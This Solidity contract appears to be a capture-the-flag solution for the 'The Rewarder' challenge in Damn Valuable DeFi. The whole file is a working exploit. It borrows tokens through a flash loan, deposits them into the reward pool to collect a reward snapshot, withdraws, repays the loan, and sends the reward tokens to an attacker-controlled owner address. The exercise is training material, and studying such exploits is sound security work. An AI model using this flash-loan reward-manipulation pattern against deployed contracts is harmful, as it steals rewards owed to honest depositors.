import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";


contract AttackReward {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;
    address payable owner;

    constructor(
        address poolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress,
        address payable _owner
    ) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // Approve the reward pool to spend our borrowed funds
        liquidityToken.approve(address(rewardPool), amount);
        
        // Deposit massive portion of funds and distributes rewards
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        // Return funds
        liquidityToken.transfer(address(pool), amount);

        // Transfer funds back to attacker
        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }
}